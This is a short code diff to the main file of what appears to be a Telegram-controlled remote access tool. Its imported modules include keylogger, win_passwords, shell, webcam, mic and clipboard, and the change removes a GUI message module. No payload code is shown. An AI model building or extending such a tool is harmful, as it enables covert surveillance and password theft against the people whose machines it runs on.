@@ -111,7 +111,7 @@ except Exception as e:
 # Import modules after setting DISPLAY
 from aiogram import Dispatcher, types
 from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic, clipboard, \
-    win_passwords, keylogger, gui_messege
+    win_passwords, keylogger
 from cfg import bot as bot
 
 # Author : Exited3n
@@ -134,7 +134,6 @@ dp.include_router(mic.router)
 dp.include_router(clipboard.router)
 dp.include_router(win_passwords.router)
 dp.include_router(keylogger.router)
-dp.include_router(gui_messege.router)
 logging.info("All routers included")
 
 
